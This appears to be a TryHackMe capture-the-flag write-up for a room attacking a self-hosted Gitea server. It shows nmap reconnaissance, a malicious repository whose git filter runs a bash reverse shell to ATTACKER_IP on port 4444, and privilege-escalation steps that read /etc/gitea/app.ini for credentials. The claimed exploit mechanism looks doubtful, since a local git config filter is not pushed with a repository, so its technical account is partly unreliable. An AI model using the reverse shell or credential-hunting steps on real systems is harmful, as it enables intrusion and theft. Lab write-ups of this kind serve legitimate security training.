# ⚙️ Compiled

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Compiled](https://tryhackme.com/room/compiled) |
| **Difficulty** | 🟡 Medium |
| **Category** | Web, Git |
| **OS** | Linux |
| **Tools** | nmap, git, Burp Suite |

---

## 🎯 Objective

Exploit a self-hosted Gitea instance running a vulnerable version to achieve Remote Code Execution.

---

## 🔍 Reconnaissance

```bash
nmap -sC -sV TARGET_IP
```

**Open ports:**
```
22/tcp   open  ssh
80/tcp   open  http    Gitea
3000/tcp open  http    Gitea
5000/tcp open  http    application
```

Gitea version identified — check for known CVEs:
```bash
searchsploit gitea
# Found: Gitea — Remote Code Execution
```

---

## 💥 Exploitation

**Gitea Code Injection via Malicious Repository:**

Gitea processes repository contents including `.gitattributes`. By creating a repository with a malicious configuration file, arbitrary commands can be executed on the server.

```bash
# Create repo locally
git init malicious-repo
cd malicious-repo

# Create malicious .gitattributes
echo '*.c filter=indent' > .gitattributes
git config filter.indent.clean 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'

# Commit and push to Gitea
git add .
git commit -m "initial"
git remote add origin http://TARGET_IP:3000/user/malicious-repo.git
git push -u origin main
```

When the repository is processed — shell is received.

---

## 🔐 Privilege Escalation

```bash
# Check for SUID binaries
find / -perm -4000 2>/dev/null

# Check sudo
sudo -l

# Check running processes
ps aux
# Gitea running as specific user — check its config
cat /etc/gitea/app.ini
# Database credentials often found here
```

---

## 📚 Lessons Learned

- Self-hosted Git services (Gitea, Gogs, GitLab) should always be kept up to date
- Repository processing can execute code — treat git hooks and attributes as code
- Application config files often contain database credentials — check `/etc/` directories
- Source code review of running applications is a valuable recon technique

---
*by OwlRC 🦉 | github.com/OwlRC*
